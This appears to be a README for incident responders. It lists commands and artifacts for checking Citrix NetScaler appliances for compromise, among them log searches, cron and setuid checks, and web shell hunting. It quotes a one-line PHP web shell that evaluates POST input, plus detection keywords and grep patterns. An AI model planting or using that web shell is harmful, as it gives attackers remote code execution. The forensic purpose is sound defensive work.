# Citrix Netscaler Forensics
This repository provides a comprehensive list of commands & artifacts to search for while performing a forensic investigation on Citrix Netscaler appliances. Contributions are welcome.<br>

# Table Of Contents
- [Automated Script](#automated-script)
- [Manual Forensics](#manual-forensics)
- [Launch the THOR APT Scanner](#launch-the-thor-apt-scanner)
- [References](#references)

# Automated Script
I've made a small shell script which acts as a wrapper around these commands. You can, if you want to automate the process (although I still recommend to double check manually), run the script directly on the ADC appliance.

```
chmod +x citrix-adc-forensics.sh
./citrix-adc-forensics.sh
```

# Manual Forensics

Generally located log files:
```
/var/log/*
```

Failed authentication attempts
```
zcat /var/log/ns.log.*.gz | grep "Authentication is rejected" | awk '{$1=$2=$3=$4=$5=$6=$7=$8=""; print $0}' | sort | uniq -c | sort -nr
```

SSH logs
```
zcat /var/log/auth.log.*.gz | grep -i "sshd" | grep -i "accepted password" | awk '{$1=$2=$3=$4=$5=$6=$7=$8=""; sub(/^[[:space:]]+/, ""); print "Accepted password for " $0}' | uniq -c | sort -nr
```

Search for suspicious commands
```
curl
hostname
uname
nobody
whoami
id
```

Search for suspicious activity in the http logs
```
/var/log/httpaccess.log
/var/log/httperror.log
```

Look for suspicious files in these directories. Payloads are often placed here.
```
/netscaler/portal/templates
/var/tmp/netscaler/portal/templates
```

Look for processes and child processes
```
ps aux
ps aux | grep nobody
```

Look for cronjobs and also the cron history
```
crontab -l -u nobody
crontab -l -u nsroot
crontab -l -u root

/var/log/cron
```

Look for unauthorized modifications to the crontab file and/or existence of suspicious files in /var/cron/tabs and other locations
```
find / -type f -name “res*” | grep -E ‘res($|\.[a-z]{3})$’
```

Check the file integrity with a md5 sum. Compare them with a 100% secure ADC.
```
cd /netscaler ; for i in “nsppe nsaaad nsconf nsreadfile nsconmsg”; do md5 ${i} ; done
```

Check for APT5 techniques. This should provide no output. If yes, potential compromise.
```
procstat –v $(pgrep –o –i nsppe) | grep “0x10400000 “ | grep “rwx”
```

Check for unusual administrator activity. You can look for the `pb_policy` in the `ns.log` file.
```
Example:

<local0.info> [hostname] pb_policy: Changing pitboss policy from X to Y
<local0.info> [hostname] pb_policy: Changing pitboss policy from Y to X

X & Y are constant values for you system
```

Check for potential PHP WebShells
```
/var/netscaler/logon/LogonPoint/uiareas/[FILE].php


content could be something like this:
<?php http_response_code(201); @eval($_POST[5]);

Look out in the httpaccess.log file for POST requests for the /logon/LogonPoint URL

Commmand1

fgrep -a -e http_response_code -e '$_POST' -r /var/netscaler/ | fgrep -v -e '/var/netscaler/gui/admin_ui' -e '/netscaler/websocketd' -e '/netscaler/ns_gui/admin_ui'

Command2

fgrep -a -e http_response_code -e '$_POST' -r /var/vpn/ | fgrep -v -e' /var/netscaler/gui/admin_ui' -e '/netscaler/websocketd' -e '/netscaler/ns_gui/admin_ui'

Command3

fgrep -a -e http_response_code -e '$_POST' -r /netscaler/ | fgrep -v -e '/var/netscaler/gui/admin_ui' -e '/netscaler/websocketd' -e '/netscaler/ns_gui/admin_ui'
```

Check for php files excluding folders that have PHP files from them by default
```
find / -type f -name *.php* -not -path "/var/netscaler/gui/admin_ui/*" -not -path "/netscaler/websocketd/*" -not -path "/netscaler/ns_gui/admin_ui/*"
```

Search for *setuid* binaries. This is a setuid Privilege Escalation technique.
```
find / -perm -4000 -user root -exec ls -lc {} \;

normal files which have the setuid bit set

-r-sr-xr-x 1 root wheel 27872 Jul 10 18:24 /netscaler/ping   
-r-sr-xr-x 1 root wheel 32656 Jul 10 18:24 /netscaler/ping6   
-r-sr-xr-x 1 root wheel 31844 Jul 10 18:24 /netscaler/traceroute  
-r-sr-xr-x 1 root wheel 24784 Jul 10 18:24 /netscaler/traceroute6   
-r-sr-xr-- 1 root operator 10584 Jul 10 18:09 /sbin/mksnap_ffs   
-r-sr-xr-- 2 root operator 15936 Jul 10 18:09 /sbin/shutdown   
-r-sr-xr-- 2 root operator 15936 Jul 10 18:09 /sbin/poweroff   
-r-sr-xr-x 1 root wheel 34352 Jul 10 18:09 /usr/bin/crontab   
-r-sr-xr-x 1 root wheel 11632 Jul 10 18:09 /usr/bin/lock   
-r-sr-xr-x 1 root wheel 24552 Jul 10 18:09 /usr/bin/login   
-r-sr-xr-x 1 root wheel 9736 Jul 10 18:09 /usr/bin/passwd   
-r-sr-xr-x 1 root wheel 16408 Jul 10 18:09 /usr/bin/su   
-r-sr-xr-x 1 root wheel 74008 Jul 10 18:09 /usr/libexec/ssh-keysign
```

# Launch the THOR APT Scanner
[@Neo23x0](https://github.com/Neo23x0) a.k.a Florian Roth did a pretty good guide on how to use the free version of the THOR APT Scanner to scan the Citrix ADC.<br><br>
Follow the link: https://www.nextron-systems.com/2020/01/14/automated-citrix-netscaler-forensic-analysis-with-thor/


# References
2024-01-26, https://trustedsec.com/blog/netscaler-remote-code-execution-forensics<br>
2024-01-26, https://www.mandiant.com/resources/blog/session-hijacking-citrix-cve-2023-4966<br>
2024-01-26, https://support.citrix.com/article/CTX227560/citrix-adc-logs-collection-guide<br>
2024-01-26, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-201a<br>
2024-01-26, https://www.nextron-systems.com/2020/01/14/automated-citrix-netscaler-forensic-analysis-with-thor/<br>
2024-01-26, https://media.defense.gov/2022/Dec/13/2003131586/-1/-1/0/CSA-APT5-CITRIXADC-V1.PDF<br>
